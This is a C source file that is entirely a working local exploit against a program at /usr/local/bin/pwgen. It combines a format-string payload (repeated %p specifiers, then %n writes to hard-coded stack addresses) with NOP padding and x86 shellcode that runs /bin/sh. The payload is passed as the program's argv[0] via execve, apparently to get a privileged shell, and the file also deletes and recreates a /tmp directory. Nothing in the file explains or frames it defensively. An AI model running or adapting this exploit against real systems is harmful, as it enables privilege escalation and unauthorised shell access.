#include <stdio.h>
#include <stdlib.h>
#include "shellcode.h"

#define NOP  0x90

int main(int argc, char *argv[]) {
  char *arg[3];
  char *buff, *ptr;
  int i;
  FILE* fd;
  char format[] = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%17u%n%190u%n%241u%n%64u%n"; 
  char hexa[] = "\x90\x90\x90\x90\x01\x01\x01\x01\x3c\xd9\xbf\xff\x01\x01\x01\x01\x3d\xd9\xbf\xff\x01\x01\x01\x01\x3e\xd9\xbf\xff\x01\x01\x01\x01\x3f\xd9\xbf\xff\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

  system("rm /tmp/pwgen_random");
  system("mkdir /tmp/pwgen_random");

  if (!(buff = malloc(strlen(format) + strlen(hexa)))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  for (i = 0; i < strlen(format); i++)
    buff[i] = format[i];
  
  ptr = buff + strlen(format);
  for (i = 0; i < strlen(hexa); i++)
    *(ptr++) = hexa[i];

  arg[0] = buff;
  arg[1] = "-e";
  arg[2] = NULL;

  execve("/usr/local/bin/pwgen", arg, NULL);
  return 0;
}